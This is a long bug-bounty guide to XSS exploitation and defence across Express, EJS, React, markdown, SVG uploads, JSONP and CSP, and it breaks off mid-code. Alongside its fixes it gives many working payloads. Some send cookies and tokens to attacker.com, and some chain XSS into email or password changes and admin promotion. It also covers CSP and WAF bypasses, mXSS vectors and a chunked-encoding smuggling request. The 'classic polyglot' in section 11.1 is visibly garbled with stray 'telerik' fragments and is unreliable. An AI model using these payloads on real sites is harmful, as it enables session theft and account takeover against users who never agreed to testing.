---
title: "XSS Attacks in Modern Frontends: A Complete Exploitation and Defense Guide for Bug Bounty Hunters"
slug: "xss-attacks-modern-frontends-complete-exploitation-defense-guide"
meta_description: "Deep-dive into XSS exploitation in React, markdown renderers, SVG uploads, and JSON responses. Covers stored, reflected, DOM, and mutation XSS with real payloads, CSP bypasses, WAF evasion, Burp Suite workflows, and production-grade fixes."
keywords:
  - XSS attacks
  - stored XSS
  - reflected XSS
  - DOM XSS
  - mutation XSS
  - React XSS dangerouslySetInnerHTML
  - markdown XSS
  - SVG XSS
  - CSP bypass
  - WAF bypass XSS
  - polyglot XSS
  - Burp Suite DOM Invader
  - bug bounty XSS
  - XSS to account takeover
  - XSS to CSRF chain
  - Express.js XSS prevention
---

# XSS Attacks in Modern Frontends: A Complete Exploitation and Defense Guide for Bug Bounty Hunters

## Introduction

Cross-Site Scripting remains the most reported vulnerability class on every major bug bounty platform. HackerOne's 2024 data shows XSS accounting for roughly 18% of all valid submissions, with payouts ranging from $500 for a reflected XSS on a subdomain to $25,000+ for stored XSS leading to account takeover on a primary application.

The misconception that modern frameworks like React have "solved" XSS is dangerously wrong. React's JSX escaping protects against the most trivial injection vectors, but it does nothing when developers explicitly bypass it with `dangerouslySetInnerHTML`, render user-controlled data into `href` attributes, or pipe markdown through libraries that were never designed with adversarial input in mind.

This guide is written for practitioners who already understand HTTP, Burp Suite, and JavaScript fundamentals. We will move fast through the basics and spend the majority of our time on exploitation techniques that actually land in production applications: mutation XSS, CSP bypasses, polyglot payloads, WAF evasion, SVG-based injection, and chaining XSS into full account takeover.

Every payload, code snippet, and HTTP request in this article has been tested against real or realistic targets. Where we show vulnerable code, we follow it immediately with the hardened version.

---

## 1. Stored XSS in User Profiles, Comments, and Markdown Fields

Stored XSS is the highest-impact variant because the payload persists on the server and fires every time any user views the affected page. The attack surface in modern applications is enormous: profile bios, display names, comment systems, markdown-enabled editors, forum posts, support tickets, and webhook configuration fields.

### 1.1 Classic Stored XSS in a Comment System

Consider an Express.js endpoint that saves comments and renders them in an EJS template.

**Vulnerable Express.js endpoint:**

```javascript
// routes/comments.js -- VULNERABLE
const express = require('express');
const router = express.Router();
const db = require('../db');

router.post('/api/comments', async (req, res) => {
  const { postId, body } = req.body;
  // No sanitization -- raw user input stored directly
  await db.query(
    'INSERT INTO comments (post_id, body, author_id) VALUES ($1, $2, $3)',
    [postId, body, req.session.userId]
  );
  res.json({ success: true });
});

router.get('/posts/:id', async (req, res) => {
  const post = await db.query('SELECT * FROM posts WHERE id = $1', [req.params.id]);
  const comments = await db.query(
    'SELECT c.body, u.display_name FROM comments c JOIN users u ON c.author_id = u.id WHERE c.post_id = $1',
    [req.params.id]
  );
  // EJS template renders body without escaping
  res.render('post', { post: post.rows[0], comments: comments.rows });
});
```

**Vulnerable EJS template:**

```html
<!-- views/post.ejs -- VULNERABLE -->
<div class="comments">
  <% comments.forEach(function(comment) { %>
    <div class="comment">
      <strong><%= comment.display_name %></strong>
      <p><%- comment.body %></p>  <!-- <%- %> outputs unescaped HTML -->
    </div>
  <% }); %>
</div>
```

The `<%-` tag in EJS outputs raw HTML. The attacker posts:

```http
POST /api/comments HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=abc123

{
  "postId": 42,
  "body": "<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">"
}
```

Every user who views post 42 sends their cookies to the attacker.

**Fixed Express.js endpoint with DOMPurify on the server:**

```javascript
// routes/comments.js -- FIXED
const express = require('express');
const router = express.Router();
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);
const db = require('../db');

router.post('/api/comments', async (req, res) => {
  const { postId, body } = req.body;
  // Sanitize on write -- strip all dangerous HTML
  const cleanBody = DOMPurify.sanitize(body, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'code', 'pre'],
    ALLOWED_ATTR: ['href'],
  });
  await db.query(
    'INSERT INTO comments (post_id, body, author_id) VALUES ($1, $2, $3)',
    [postId, cleanBody, req.session.userId]
  );
  res.json({ success: true });
});
```

**Fixed EJS template:**

```html
<!-- views/post.ejs -- FIXED -->
<div class="comments">
  <% comments.forEach(function(comment) { %>
    <div class="comment">
      <strong><%= comment.display_name %></strong>
      <p><%= comment.body %></p>  <!-- <%= %> HTML-encodes output -->
    </div>
  <% }); %>
</div>
```

### 1.2 Stored XSS in User Profile Display Names

Display names are a notoriously overlooked vector. Developers often validate length but not content. When the display name appears in notifications, emails, or admin dashboards, stored XSS fires in contexts the developer never considered.

**Payload for display name field:**

```json
{
  "display_name": "John<script>new Image().src='https://attacker.com/c?d='+document.cookie</script>"
}
```

If the admin panel renders display names without encoding, you get stored XSS in the admin context, which frequently has elevated privileges, CSRF tokens for user management, and access to internal APIs.

### 1.3 Stored XSS in Markdown Fields

Many applications allow users to write in Markdown and render the output as HTML. The rendering libraries `marked` and `markdown-it` have different default behaviors around HTML passthrough.

**Vulnerable marked configuration:**

```javascript
const marked = require('marked');

// marked v4 and earlier: sanitize option was deprecated and removed
// Many developers assume the library is safe by default
const html = marked.parse(userInput);
// If userInput = "# Hello\n<img src=x onerror=alert(1)>"
// Output: <h1>Hello</h1>\n<img src=x onerror=alert(1)>
```

**Vulnerable markdown-it configuration:**

```javascript
const md = require('markdown-it')({ html: true }); // html: true allows raw HTML passthrough
const html = md.render(userInput);
// Same problem -- raw HTML passes through
```

**Payload targeting markdown renderers:**

```markdown
Check out my [profile](javascript:alert(document.cookie))

![img](x "onerror=alert(1)")

<details open ontoggle=alert(1)>
<summary>Click me</summary>
</details>
```

**Fixed markdown-it configuration:**

```javascript
const md = require('markdown-it')({ html: false }); // Disable raw HTML
const sanitize = require('markdown-it-sanitizer');
md.use(sanitize);

// Additionally, post-process with DOMPurify
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const DOMPurify = createDOMPurify(new JSDOM('').window);

function renderMarkdown(input) {
  const rawHtml = md.render(input);
  return DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['h1','h2','h3','h4','h5','h6','p','br','strong','em',
                   'a','ul','ol','li','code','pre','blockquote','img','table',
                   'thead','tbody','tr','th','td'],
    ALLOWED_ATTR: ['href', 'src', 'alt', 'title'],
    ALLOW_DATA_ATTR: false,
  });
}
```

---

## 2. Reflected XSS in Search Parameters and Error Messages

Reflected XSS requires social engineering to deliver the payload URL to the victim. Despite this lower barrier, it still pays well in bug bounty programs because it can be chained with other vulnerabilities or delivered via phishing.

### 2.1 Classic Reflected XSS in Search

**Vulnerable Express.js endpoint:**

```javascript
// routes/search.js -- VULNERABLE
router.get('/search', async (req, res) => {
  const query = req.query.q;
  const results = await db.search(query);
  // Reflecting the search term back into the page without encoding
  res.send(`
    <html>
      <body>
        <h1>Search results for: ${query}</h1>
        <div id="results">${renderResults(results)}</div>
      </body>
    </html>
  `);
});
```

**Exploitation:**

```
https://target.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
```

URL-encoded version for delivery:

```
https://target.com/search?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fattacker.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E
```

### 2.2 Reflected XSS in Error Messages

Error pages that reflect user input are extremely common. A 404 handler that includes the requested path, a validation error that echoes the invalid field value, or a debug mode that dumps query parameters.

**Vulnerable error handler:**

```javascript
// middleware/error.js -- VULNERABLE
app.use((req, res) => {
  res.status(404).send(`<h1>404</h1><p>The page ${req.originalUrl} was not found.</p>`);
});
```

**Payload:**

```
https://target.com/<img/src=x onerror=alert(1)>
```

**Fixed error handler:**

```javascript
// middleware/error.js -- FIXED
const escapeHtml = require('escape-html');

app.use((req, res) => {
  res.status(404).send(`<h1>404</h1><p>The page ${escapeHtml(req.originalUrl)} was not found.</p>`);
});
```

### 2.3 Reflected XSS via HTTP Headers

Some applications reflect `Referer`, `User-Agent`, or custom headers into the response. These are harder to exploit because the attacker must control the victim's headers, but in specific contexts (admin log viewers, analytics dashboards), they become viable.

**Burp Suite testing approach:**

1. Send the request to Repeater.
2. Inject `<script>alert(1)</script>` into each reflected header.
3. Check if the response renders the header value in an HTML context.
4. If the value is reflected inside a JavaScript string, try breaking out: `';alert(1);//`

---

## 3. DOM XSS via location.hash, postMessage, and URL Fragments

DOM XSS is the hardest variant to detect with automated scanners because the payload never reaches the server. The vulnerability exists entirely in client-side JavaScript that reads from attacker-controllable sources (`location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`) and passes the value to a dangerous sink (`innerHTML`, `document.write`, `eval`, `setTimeout`, `jQuery.html()`).

### 3.1 DOM XSS via location.hash

**Vulnerable client-side code:**

```javascript
// app.js -- VULNERABLE
// Tab navigation using URL hash
const tab = location.hash.substring(1);
document.getElementById('tab-content').innerHTML = 
  `<div class="tab-panel" data-tab="${tab}">Loading ${tab}...</div>`;
```

**Payload:**

```
https://target.com/dashboard#"><img src=x onerror=alert(document.domain)>
```

The hash value is never sent to the server, so server-side WAFs and logging will not see it.

### 3.2 DOM XSS via postMessage

Single-page applications frequently use `postMessage` for cross-origin communication with embedded iframes (payment processors, chat widgets, OAuth popups). If the message handler does not verify the origin, any page can send a malicious message.

**Vulnerable postMessage handler:**

```javascript
// widget.js -- VULNERABLE
window.addEventListener('message', function(event) {
  // No origin check
  const data = JSON.parse(event.data);
  if (data.type === 'updateContent') {
    document.getElementById('widget-body').innerHTML = data.html;
  }
});
```

**Attacker's page:**

```html
<html>
<body>
<iframe id="target" src="https://target.com/widget"></iframe>
<script>
  setTimeout(() => {
    document.getElementById('target').contentWindow.postMessage(
      JSON.stringify({
        type: 'updateContent',
        html: '<img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">'
      }),
      '*'
    );
  }, 2000);
</script>
</body>
</html>
```

**Fixed postMessage handler:**

```javascript
// widget.js -- FIXED
const ALLOWED_ORIGINS = ['https://trusted-parent.com', 'https://app.target.com'];

window.addEventListener('message', function(event) {
  if (!ALLOWED_ORIGINS.includes(event.origin)) {
    console.warn('Rejected message from unauthorized origin:', event.origin);
    return;
  }
  
  const data = JSON.parse(event.data);
  if (data.type === 'updateContent') {
    // Use textContent instead of innerHTML, or sanitize
    document.getElementById('widget-body').textContent = data.text;
  }
});
```

### 3.3 DOM XSS via URL Fragment Parameters

Modern SPAs often parse complex data from URL fragments for client-side routing:

```javascript
// router.js -- VULNERABLE
// URL: https://app.com/#/profile?name=<script>alert(1)</script>
const params = new URLSearchParams(location.hash.split('?')[1]);
const name = params.get('name');
document.querySelector('.welcome').innerHTML = `Welcome, ${name}!`;
```

---

## 4. React-Specific XSS: dangerouslySetInnerHTML Abuse

React's virtual DOM escapes interpolated values by default. `{userInput}` in JSX is safe. The problems begin when developers need to render HTML and reach for `dangerouslySetInnerHTML`.

### 4.1 Vulnerable React Component

```jsx
// CommentBody.jsx -- VULNERABLE
import React from 'react';

function CommentBody({ comment }) {
  // Developer wants to render markdown-generated HTML
  return (
    <div 
      className="comment-body"
      dangerouslySetInnerHTML={{ __html: comment.htmlBody }}
    />
  );
}

export default CommentBody;
```

If `comment.htmlBody` comes from an API that stores unsanitized user input, this is stored XSS. The React framework provides zero protection here because the developer has explicitly opted out.

### 4.2 XSS via href and src Attributes

Even without `dangerouslySetInnerHTML`, React does not sanitize URL schemes in `href` and `src` attributes (React 16 removed the `javascript:` warning, and while React 19 has improved warnings, execution still depends on the context):

```jsx
// UserProfile.jsx -- VULNERABLE
function UserProfile({ user }) {
  return (
    <div>
      <h2>{user.name}</h2>
      {/* user.website could be "javascript:alert(document.cookie)" */}
      <a href={user.website}>Visit website</a>
    </div>
  );
}
```

**Payload stored in user profile:**

```json
{
  "name": "Legitimate User",
  "website": "javascript:fetch('https://attacker.com/steal?c='+document.cookie)"
}
```

### 4.3 Fixed React Components

```jsx
// CommentBody.jsx -- FIXED
import React from 'react';
import DOMPurify from 'dompurify';

function CommentBody({ comment }) {
  const sanitizedHtml = DOMPurify.sanitize(comment.htmlBody, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li',
                   'code', 'pre', 'blockquote', 'h1', 'h2', 'h3'],
    ALLOWED_ATTR: ['href'],
    ALLOW_DATA_ATTR: false,
  });

  return (
    <div 
      className="comment-body"
      dangerouslySetInnerHTML={{ __html: sanitizedHtml }}
    />
  );
}
```

```jsx
// UserProfile.jsx -- FIXED
function UserProfile({ user }) {
  const sanitizeUrl = (url) => {
    try {
      const parsed = new URL(url);
      if (!['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
        return '#';
      }
      return parsed.toString();
    } catch {
      return '#';
    }
  };

  return (
    <div>
      <h2>{user.name}</h2>
      <a href={sanitizeUrl(user.website)} rel="noopener noreferrer nofollow">
        Visit website
      </a>
    </div>
  );
}
```

### 4.4 React SSR (Server-Side Rendering) XSS

When using `ReactDOMServer.renderToString()`, the rendered HTML is sent to the client. If user data is injected into the initial state object that hydrates the React app, XSS can occur:

```jsx
// server.jsx -- VULNERABLE
const initialState = {
  user: { name: userFromDb.name } // userFromDb.name = "</script><script>alert(1)</script>"
};

const html = `
  <html>
    <body>
      <div id="root">${ReactDOMServer.renderToString(<App />)}</div>
      <script>
        window.__INITIAL_STATE__ = ${JSON.stringify(initialState)};
      </script>
    </body>
  </html>
`;
```

The `</script>` in the user's name closes the script tag early. Fix: use the `serialize-javascript` library which escapes HTML-special characters within JSON.

```javascript
const serialize = require('serialize-javascript');

const html = `
  <script>
    window.__INITIAL_STATE__ = ${serialize(initialState, { isJSON: true })};
  </script>
`;
```

---

## 5. SVG-Based XSS via File Uploads

SVG files are XML documents that can contain embedded JavaScript. When an application allows SVG uploads and serves them with a `Content-Type: image/svg+xml` header (or without `Content-Disposition: attachment`), the browser will execute any embedded scripts.

### 5.1 Malicious SVG Payload

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
  </script>
</svg>
```

**Alternative SVG XSS vectors:**

```xml
<!-- Using onload event -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100"/>
</svg>

<!-- Using animate element -->
<svg xmlns="http://www.w3.org/2000/svg">
  <animate onbegin="alert(1)" attributeName="x" dur="1s"/>
</svg>

<!-- Using foreignObject -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <iframe src="javascript:alert(1)"></iframe>
    </body>
  </foreignObject>
</svg>

<!-- Using set element -->
<svg xmlns="http://www.w3.org/2000/svg">
  <set attributeName="onmouseover" to="alert(1)"/>
  <rect width="200" height="200"/>
</svg>
```

### 5.2 Uploading via Burp Suite

```http
POST /api/upload/avatar HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Cookie: session=abc123

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="avatar.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100" fill="red"/>
</svg>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

If the server stores the file and serves it at `https://target.com/uploads/avatar.svg`, any user who visits that URL gets XSS in the target's origin.

### 5.3 Prevention for SVG Uploads

```javascript
// middleware/upload.js -- FIXED
const multer = require('multer');
const sharp = require('sharp');
const path = require('path');
const crypto = require('crypto');

const ALLOWED_IMAGE_TYPES = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
// Note: SVG is deliberately excluded

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB
  fileFilter: (req, file, cb) => {
    if (!ALLOWED_IMAGE_TYPES.includes(file.mimetype)) {
      return cb(new Error('Only JPEG, PNG, GIF, and WebP images are allowed'));
    }
    cb(null, true);
  },
});

router.post('/api/upload/avatar', upload.single('file'), async (req, res) => {
  // Re-encode image through sharp to strip any embedded metadata/scripts
  const sanitizedBuffer = await sharp(req.file.buffer)
    .resize(256, 256, { fit: 'cover' })
    .png() // Convert to PNG regardless of input format
    .toBuffer();

  const filename = crypto.randomBytes(16).toString('hex') + '.png';
  // Serve from a separate cookieless domain
  await uploadToS3(sanitizedBuffer, `avatars/${filename}`, {
    ContentType: 'image/png',
    ContentDisposition: 'inline',
  });

  res.json({ url: `https://static-cdn.target.com/avatars/${filename}` });
});
```

Key defenses: reject SVG uploads entirely, re-encode through an image processing library, serve user uploads from a separate cookieless domain (so even if XSS fires, there are no cookies to steal from the main application origin).

---

## 6. XSS in JSON Responses Rendered in HTML

When an API returns JSON and a page renders part of that JSON into the DOM without encoding, XSS can result. This is especially common in SPAs that fetch data from APIs and render it client-side.

### 6.1 Vulnerable Pattern

```javascript
// API response:
// GET /api/users/123
// { "id": 123, "bio": "<img src=x onerror=alert(1)>" }

// Client-side rendering -- VULNERABLE
fetch('/api/users/123')
  .then(res => res.json())
  .then(user => {
    document.getElementById('user-bio').innerHTML = user.bio;
  });
```

### 6.2 JSON Response Sniffing

Older browsers (and some edge cases) may render a JSON response as HTML if the `Content-Type` header is missing or incorrect. An attacker who can inject HTML into a JSON response body and trick the browser into rendering it as HTML achieves XSS.

**Mitigation:** Always set `Content-Type: application/json` on API responses and add `X-Content-Type-Options: nosniff`.

```javascript
// Express.js middleware -- FIXED
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});
```

### 6.3 JSONP Callback Injection

Legacy JSONP endpoints are an extremely fertile XSS source:

```
https://target.com/api/data?callback=alert(document.cookie)//
```

Response:

```javascript
alert(document.cookie)//({data: "..."})
```

This is a direct XSS in the target's origin. If the application no longer uses JSONP but the endpoint still exists, it is still exploitable.

---

## 7. Chaining XSS to Account Takeover

Finding XSS is step one. Demonstrating impact is what earns the bounty. The most effective way to demonstrate impact is chaining XSS into account takeover.

### 7.1 Stealing Session Cookies

If cookies are not `HttpOnly`:

```javascript
// Payload
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ cookies: document.cookie }),
  headers: { 'Content-Type': 'application/json' }
});
```

### 7.2 Stealing Tokens from localStorage/sessionStorage

Many SPAs store JWT tokens in `localStorage`:

```javascript
// Payload targeting localStorage JWT
const token = localStorage.getItem('access_token') || 
              localStorage.getItem('token') ||
              sessionStorage.getItem('access_token');

fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: token }),
  headers: { 'Content-Type': 'application/json' }
});
```

### 7.3 Performing Actions as the Victim

Even if cookies are `HttpOnly` and tokens are not accessible, XSS in the same origin can make authenticated requests:

```javascript
// Change victim's email address
fetch('/api/account/email', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include', // Sends HttpOnly cookies automatically
  body: JSON.stringify({ email: 'attacker@evil.com' })
})
.then(() => {
  // Trigger password reset to the new email
  return fetch('/api/auth/password-reset', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'attacker@evil.com' })
  });
});
```

### 7.4 Extracting CSRF Tokens and API Keys

```javascript
// Fetch the settings page, extract the CSRF token, then change the password
fetch('/settings')
  .then(r => r.text())
  .then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const csrfToken = doc.querySelector('input[name="_csrf"]').value;
    
    return fetch('/settings/password', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      credentials: 'include',
      body: `_csrf=${csrfToken}&new_password=attacker123&confirm_password=attacker123`
    });
  });
```

---

## 8. XSS to CSRF Chain

When an application has CSRF protection (tokens, SameSite cookies), XSS in the same origin bypasses all of it. XSS operates within the origin, so it can read CSRF tokens from the DOM, make same-origin requests with cookies attached, and bypass SameSite restrictions.

### 8.1 Practical Chain: XSS to Admin Privilege Escalation

```javascript
// Step 1: Extract CSRF token from admin panel
fetch('/admin/users')
  .then(r => r.text())
  .then(html => {
    const csrf = html.match(/name="_csrf" value="([^"]+)"/)[1];
    
    // Step 2: Promote attacker's account to admin
    return fetch('/admin/users/attacker-user-id/promote', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      credentials: 'include',
      body: `_csrf=${csrf}&role=admin`
    });
  })
  .then(r => {
    // Step 3: Exfiltrate confirmation
    fetch('https://attacker.com/log?status=promoted');
  });
```

This demonstrates why XSS is often rated higher severity than CSRF alone. XSS subsumes CSRF.

---

## 9. CSP Bypass Techniques

Content Security Policy is the strongest browser-side defense against XSS, but misconfigurations are rampant.

### 9.1 Common CSP Misconfigurations

**Overly permissive script-src:**

```
Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com
```

If `cdnjs.cloudflare.com` is allowed, the attacker can load any library from it, including AngularJS, which has known CSP bypass gadgets:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
<div ng-app ng-csp>
  {{$eval.constructor('alert(document.domain)')()}}
</div>
```

### 9.2 CSP Bypass via base-uri

If the CSP does not restrict `base-uri`:

```html
<base href="https://attacker.com/">
<!-- All relative script src will now load from attacker.com -->
```

If the page loads `<script src="/js/app.js">`, the browser will fetch `https://attacker.com/js/app.js`.

### 9.3 CSP Bypass via JSONP Endpoints

If the CSP allows a domain that has a JSONP endpoint:

```
Content-Security-Policy: script-src 'self' https://accounts.google.com
```

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script>
```

### 9.4 CSP Bypass via unsafe-eval

```
Content-Security-Policy: script-src 'self' 'unsafe-eval'
```

With `unsafe-eval`, the attacker can use `eval()`, `setTimeout('string')`, `new Function()`, etc.:

```html
<img src=x onerror="eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))">
```

### 9.5 CSP Bypass via Dangling Markup Injection

When inline scripts are blocked but the attacker can inject HTML:

```html
<img src="https://attacker.com/steal?
```

This unclosed tag will consume everything until the next `"` in the page, potentially exfiltrating CSRF tokens, API keys, or other sensitive data that appears in the HTML source.

### 9.6 Strict CSP Recommendation

```
Content-Security-Policy: 
  default-src 'none';
  script-src 'strict-dynamic' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  img-src 'self' https://static-cdn.target.com;
  connect-src 'self';
  font-src 'self';
  object-src 'none';
  base-uri 'none';
  form-action 'self';
  frame-ancestors 'none';
  require-trusted-types-for 'script';
```

---

## 10. Mutation XSS (mXSS)

Mutation XSS exploits the browser's HTML parsing behavior. When a sanitizer processes HTML as a string, the output may be safe as a string, but when the browser parses it into the DOM, the resulting DOM tree may differ from what the sanitizer expected, producing executable JavaScript.

### 10.1 How mXSS Works

The browser's HTML parser has complex rules for handling malformed HTML. Different contexts (e.g., inside `<svg>`, `<math>`, `<table>`) trigger different parsing modes. A sanitizer that operates on the string representation may not account for these context switches.

**Classic mXSS payload:**

```html
<svg><![CDATA[><image>]]><img src=x onerror=alert(1)>//]]></svg>
```

**Another mXSS vector using namespace confusion:**

```html
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

The `<math>` element switches the parser into MathML mode, where parsing rules differ. The `<style>` element inside MathML is treated as a raw text element, but the parser may exit the context prematurely due to the comment sequence, allowing the `<img>` tag to be parsed as HTML.

### 10.2 mXSS Against DOMPurify

DOMPurify has historically been vulnerable to mXSS bypass (CVE-2020-26870, for example). Always use the latest version. DOMPurify 3.x uses a browser-native parser which significantly reduces mXSS surface area.

### 10.3 Testing for mXSS

1. Collect the application's sanitizer output.
2. Note which HTML elements and attributes survive sanitization.
3. Test namespace-switching payloads (`<svg>`, `<math>`, `<foreignObject>`).
4. Check if the sanitizer's output, when re-parsed by the browser, produces a different DOM tree than expected.
5. Use browser DevTools to compare the sanitized HTML string vs. the actual DOM after insertion.

---

## 11. Polyglot XSS Payloads

A polyglot payload executes in multiple injection contexts (HTML attribute, JavaScript string, URL parameter, HTML body) without modification.

### 11.1 Classic Polyglot

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik8telerik_telerik/telerik/oNcliCk=alert()//</telerik>%0telerikA%0telerik<telerik/telerikstyle=telerikx:telerikexpression(alert())>telerik'"><img src=x onerror=alert(1)>//'/*</script></style></select></textarea>--></noscript></xmp>
```

### 11.2 Practical Polyglot for Bug Bounty

This payload works in HTML body, HTML attribute (single/double quoted, unquoted), JavaScript string, and URL contexts:

```
'"><img src=x onerror=alert(1)>{{7*7}}<script>alert(1)</script>
```

A more refined version that accounts for common filters:

```
"><svg/onload=alert(1)>//
```

### 11.3 Context-Specific Payloads

**Inside a JavaScript string (single-quoted):**

```
';alert(1);//
```

**Inside an HTML attribute (double-quoted):**

```
" onfocus=alert(1) autofocus="
```

**Inside a JavaScript template literal:**

```
${alert(1)}
```

**Inside a CSS context:**

```
</style><script>alert(1)</script>
```

---

## 12. WAF Bypass for XSS

Web Application Firewalls are the last line of defense many applications rely on. They are also routinely bypassed.

### 12.1 Case Variation

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### 12.2 Encoding Bypasses

**HTML entity encoding:**

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
```

**Unicode escapes in JavaScript:**

```html
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

**Double URL encoding (when the WAF decodes once but the app decodes twice):**

```
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### 12.3 Tag and Event Handler Alternatives

When `<script>` and `onerror` are blocked:

```html
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<meter onmouseover=alert(1)>0</meter>
```

### 12.4 Null Bytes and Comments

```html
<scr%00ipt>alert(1)</scr%00ipt>
<img src=x onerror=alert/*comment*/(1)>
<img src=x onerror=alert`1`>
```

### 12.5 Chunked Transfer Encoding

Some WAFs fail to inspect chunked request bodies:

```http
POST /api/comments HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

7
body=<s
5
cript
8
>alert(
3
1)<
9
/script>
0

```

### 12.6 Content-Type Switching

If the backend accepts both `application/json` and `application/x-www-form-urlencoded`, but the WAF only inspects form-encoded bodies:

```http
POST /api/comments HTTP/1.1
Host: target.com
Content-Type: application/json

{"body": "<script>alert(1)</script>"}
```

### 12.7 Recursive Bypass

If the WAF strips `<script>` once:

```html
<scrscriptipt>alert(1)</scrscriptipt>
```

After the WAF removes `<script>` from the middle, the remaining characters form `<script>`.

---

## 13. Burp Suite DOM Invader Workflow

DOM Invader is a browser extension built into Burp's embedded Chromium browser. It automates DOM XSS discovery by injecting canary values into sources and monitoring sinks.

### 13.1 Setup

1. Open Burp Suite Professional.
2. Go to the **Proxy** tab and open Burp's embedded browser.
3. Click the **DOM Invader** icon in the browser toolbar.
4. Enable DOM Invader and configure the canary string (default works fine).

### 13.2 Testing Workflow

1. **Navigate to the target application.** DOM Invader will automatically inject canary values into URL parameters, fragment identifiers, cookies, and `postMessage` events.

2. **Check the DOM Invader panel.** It shows which sources had the canary injected and which sinks received it. A source-to-sink flow indicates a potential DOM XSS.

3. **Analyze the sink.** If the canary reaches `innerHTML`, `document.write`, `eval`, or similar dangerous sinks, click the finding to see the full stack trace.

4. **Generate a proof-of-concept.** Replace the canary with an actual XSS payload appropriate for the sink context.

5. **Test postMessage handlers.** Enable "Postmessage interception" in DOM Invader settings. It will enumerate all message handlers and test them with attacker-controlled messages.

### 13.3 Manual DOM XSS Hunting with DevTools

When DOM Invader does not find the issue:

1. Open Chrome DevTools, go to **Sources** tab.
2. Set breakpoints on known sinks:
   - `document.write`
   - `Element.innerHTML` (set a conditional breakpoint)
   - `eval`
   - `setTimeout` / `setInterval` with string arguments
3. Navigate the application and monitor which user-controlled data reaches these breakpoints.
4. Use the **Console** to trace data flow: `monitorEvents(document, 'message')` to see all postMessage events.

### 13.4 Burp Suite Scanning for Reflected XSS

1. Browse the application through Burp's proxy.
2. Right-click any request in the **HTTP history** and select **Do active scan**.
3. In the scan configuration, enable **Reflected XSS** checks.
4. Review findings in the **Dashboard** tab. Burp will show the injection point and the payload that triggered the finding.
5. Manually verify each finding in Repeater before reporting.

---

## 14. Common Developer Mistakes

### 14.1 Trusting Client-Side Validation

```javascript
// Client validates but server does not -- VULNERABLE
// The attacker bypasses the frontend entirely using curl or Burp
```

Always validate and sanitize on the server. Client-side validation is a UX feature, not a security control.

### 14.2 Sanitizing on Output but Not on Storage

If you sanitize only when rendering, a future code change that renders the same data in a different context (email template, PDF export, mobile app) may bypass the sanitization. Sanitize on input AND encode on output.

### 14.3 Using Blocklists Instead of Allowlists

```javascript
// VULNERABLE -- blocklist approach
function sanitize(input) {
  return input
    .replace(/<script>/gi, '')
    .replace(/onerror/gi, '')
    .replace(/javascript:/gi, '');
}
// Trivially bypassed with: <scr<script>ipt>, ONERROR (different case), java\nscript:
```

```javascript
// FIXED -- allowlist approach with DOMPurify
const clean = DOMPurify.sanitize(input, {
